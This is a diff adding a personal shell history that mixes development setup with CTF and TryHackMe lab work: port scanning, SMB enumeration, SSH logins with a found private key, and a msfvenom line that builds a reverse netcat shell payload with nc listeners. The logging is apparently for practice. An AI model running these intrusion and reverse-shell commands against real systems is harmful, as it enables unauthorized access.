+BRAM_SERVER_URL="https://bramlett.shuttleapp.rs" flutter run --verbose
+nix-shell -p wineWow64.stagingFull
+nix-shell -p wineWow64Packages.stagingFull
+devenv shell nu
+cd client
+devenv shell nu
+cd ..
+cd client
+BRAM_SERVER_URL="https://bramlett.shuttleapp.rs" flutter run --verbose
+shutdown now
+git pull
+devenv shell nu
+nix-shell -p raspi-imager
+cd westshore/2024/hardware/hardware-hacking/
+ls
+mkdir pt-3
+cd pt-3
+cp ../pt-5/play-snake.py .
+pip install pyserial
+devenv shell nu
+cd ../..
+cd ..
+devenv shell nu
+cd westshore/2024/hardware/hardware-hacking/
+cd pt-3
+ls
+tio
+tio -b 115200 /dev/ttyUSB0
+sudo tio -b 115200 /dev/ttyUSB0
+cd ../pt-2
+python3 brute.py
+pip install pyserial
+nix-shell -p nix
+nix-shell -p pip
+nix-shell -p pipx
+pipx
+nix-shell -p pipx
+python3
+cd westshore/2024/hardware/hardware-hacking/
+cd pt-2
+python3 brute.py
+sudo python3 brute.py
+sudo -E python3 brute.py
+python3 brute.py
+sudo vim /etc/nixos/configuration.nix
+cd /etc/nixos
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos
+cd -
+python3 brute.py
+groups
+sudo vim /etc/nixos/configuration.nix
+sudo nixos-rebuild switch --flake /etc/nixos
+python3
+sudo -E $(which python3) brute.py
+sudo python3 brute.py
+sudo - $env.USER
+cd github/ctf/westshore/
+ls
+cd 2024
+ls
+cd ../..
+ls
+cd westshore/2024/hardware/hardware-hacking/
+ls
+cd pt-2
+groups
+python3 brute.py
+tio -b 115200 /dev/ttyUSB0
+python3 brute.py
+tio -b 115200 /dev/ttyUSB0
+python3 brute.py
+tio -b 115200 /dev/ttyUSB0
+python3 brute.py
+python3 -c "0xe724"
+python3 -c "print(0xe724)"
+tio -b 115200 /dev/ttyUSB0
+python3 brute.py
+tio -b 115200 /dev/ttyUSB0
+python3 brute.py
+cat /tmp/log.txt
+python3 brute.py
+cat /tmp/log.txt
+python3 brute.py
+cat /tmp/log.txt
+rm /tmp/log.txt
+cat /tmp/log.txt
+python3 brute.py
+cat /tmp/log.txt
+python3 brute.py
+cat /tmp/log.txt
+python3 brute.py
+clear
+python3 brute.py
+clear
+python3 brute.py
+tio -b 115200 /dev/ttyUSB0
+python3 brute.py
+shutdown now
+ls
+cd Music/
+ls
+cd ..
+cd onedrive/
+ls
+cd ..
+cat result
+ls result/
+sudo vim /etc/nixos/configuration.nix
+ls
+ls KEY
+cd Downloads/
+sudo mv thebotlynoob.ovpn /root/nixos/openvpn
+sudo mkdir -p /root/nixos/openvpn
+sudo mv thebotlynoob.ovpn /root/nixos/openvpn
+sudo vim /etc/nixos/configuration.nix
+cd /etc/nixos
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos
+sudo vim /etc/nixos/configuration.nix
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos
+cd -
+sudo systemctl start openvpn-tryhackme
+sudo systemctl start openvpn-tryhackme.service
+journalctl -xeu openvpn-tryhackme.service
+sudo vim /etc/nixos/configuration.nix
+cd /etc/nixos
+sudo nix flake update
+sudo nixos-rebuild switch --flake /etc/nixos
+cd -
+sudo systemctl restart openvpn-tryhackme
+cat /nix/store/ib5b9gjdkgw99rffqw7cnf2xkaj09k27-openvpn-config-tryhackme
+cat  /root/nixos/openvpn/thebotlynoob.conf 
+sudo cat  /root/nixos/openvpn/thebotlynoob.conf 
+sudo vim /etc/nixos/configuration.nix
+sudo nixos-rebuild switch --flake /etc/nixos
+sudo cat  /root/nixos/openvpn/thebotlynoob.conf 
+sudo vim /etc/nixos/configuration.nix
+sudo nixos-rebuild switch --flake /etc/nixos
+ip a s
+ls
+ip a s
+sudo systemctl start openvpn-tryhackme.service
+sudo systemctl status openvpn-tryhackme.service
+ip a s
+ping 10.200.28.21
+nix-shell -p impacket
+devenv shell nu
+wordlist_paths
+wordlists_path
+`wordlists_path`
+`wordlists_path`.2
+`wordlists_path`/3
+`wordlists_path`/rockyou.txt
+cat `wordlists_path`/rockyou.txt
+cat $(wordlists_path)/rockyou.txt
+cat (wordlists_path)/rockyou.txt
+cat "(wordlists_path)"/rockyou.txt
+cat { wordlists_path }/rockyou.txt
+bash
+rustscan
+rustscan 10.10.117.95
+rustscan --help
+rustscan -a 10.10.117.95 
+devenv shell nu
+devenv --verbose shell nu
+cd github/ctf
+devenv shell nu
+ping 10.200.28.201
+devenv gc
+enum4linux 10.10.117.95 -a
+code .
+polenum
+nix-shell -p polenum
+devenv shell nu
+polenum
+impacket
+nix-shell -p polenum
+python3 --version
+devenv shell nu
+devenv inputs add nixpkgs-python github:cachix/nixpkgs-python --follows nixpkgs
+devenv shell nu
+cd github/ctf
+devenv shell nu
+polenum
+enum4linux 10.10.117.95 -a
+smbclient
+smbclient //10.10.117.95/profiles
+ls
+cat `Working From Home Information.txt`k
+cat `Working From Home Information.txt`
+smbclient //10.10.117.95/profiles
+smbclient //10.10.117.95/profiles -U "Anonymous<\n>"
+ls
+chmod 600 id_rsa
+ssh -i id_rsa admin@10.10.117.95
+ssh -i id_rsa john@10.10.117.95
+cat .sudo_as_admin_successful
+ssh -i id_rsa cactus@10.10.117.95
+rustscan -a 10.10.89.207
+devenv --verbose shell nu
+10.10.89.207
+rustscan -a 10.10.89.207
+rustscan -a 10.10.89.207 --ulimit 1000
+rustscan -a 10.10.89.207 --ulimit 5000
+rustscan -a 10.10.89.207 --ulimit 5000 -- -p-
+rustscan -a 10.10.89.207 --ulimit 5000 --help
+rustscan -a 10.10.89.207 --ulimit 5000 -p-
+rustscan -a 10.10.89.207 --ulimit 5000 -p 1-65565
+rustscan -a 10.10.89.207 --ulimit 5000 -r 1-65565
+rustscan -a 10.10.89.207 --ulimit 5000 -r "1-65565"
+rustscan -a 10.10.89.207 --ulimit 5000 -r "1-65564"
+rustscan -a 10.10.89.207 --ulimit 5000 -r "1-6556"
+rustscan -a 10.10.89.207 --ulimit 5000 -r "1-65555"
+rustscan -a 10.10.89.207 --ulimit 5000 -r "1-10000"
+rustscan -a 10.10.89.207 --ulimit 5000
+rustscan -a 10.10.89.207 --ulimit 5000 -- -sC
+telnet 10.10.89.207 8012
+vim devenv.nix
+devenv --verbose shell nu
+vim devenv.nix
+devenv --verbose shell nu
+vim devenv.nix
+devenv --verbose shell nu
+vim devenv.nix
+telnet 10.10.89.207 8012
+tcpdump
+cd github/ctf
+tcpdump
+vim 
+vim devenv.nix
+tcpdump
+sudo tcpdump ip proto \\icmp -i tun0
+sudo tcpdump ip proto \\\\icmp -i tun0
+sudo tcpdump ip proto \\\icmp -i tun0
+sudo tcpdump ip proto icmp -i tun0
+sudo tcpdump ip proto \\icmp -i tun0<\n>
+sudo tcpdump ip proto icmp -i tun0<\n>
+fish
+ip a s
+zellij
+bash
+vim devenv.nix
+msfvenom -p cmd/unix/reverse_netcat lhost=10.6.20.231 lport=4444 R
+netcat
+nc
+bash
+vim devenv.nix
+nc -lvp 4444
+nc -lvp 4444 1111
+nc -lv 4444
+sudo tcpdump ip proto '\\icmp' -i tun0<\n>
+sudo tcpdump ip proto '\\\icmp' -i tun0<\n>
+telnet 10.10.89.207 8012
+sudo tcpdump ip proto '\icmp' -i tun0<\n>
+nc -lvnp 4444
+telnet 10.10.89.207 8012
+rustscan 10.10.243.214 -a
+rustscan -a 10.10.243.214 
+enum4linux 10.10.243.214 -a
+dig
+nix-shell -p dig
+vim devenv.nix
+enum4linux 10.10.243.214 -a
+testparm
+enum4linux 10.10.243.214 -a
+kerbrute
+nc -lvn 4444
+telnet 10.10.251.92 8012
+vim devenv.nix
+bash
+sh
+devenv shell nu
+devenv shell nu
+devenv --verbose shell nu
+fish
+vim .config/kitty/kitty.conf
+zellij --help
+nix-shell -p zellij
+vim .config/kitty/kitty.conf
+ls
+rm -rf kernel-exploits/
+git rm -rf kernel-exploits/
+git pull
+cargo run --releawse
+cargo run --release
+curl --socks5 localhost:3000 -vvv https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+curl --socks5 localhost:3000 https://gitlab.com/api/v4/projects/44042130/packages/generic/librewolf/131.0.2-1/librewolf-131.0.2-1-windows-x86_64-portable.zip -o /dev/null
+curl --socks5 localhost:3000 https://example.com
+curl --socks5 localhost:3000 https://example.com\
+curl --socks5 localhost:3000 https://example.com
+/run/current-system/sw/bin/git -C "/home/jj/github/dirtysocks" -c "core.editor=code --wait --reuse-window" revert --no-edit 1e35404c9168c4e8e3caa2d580c1675b69b0b50b
+git revert --abort
+git revert --abort\
+git revert --abort
+curl --socks5 localhost:3000 https://example.com
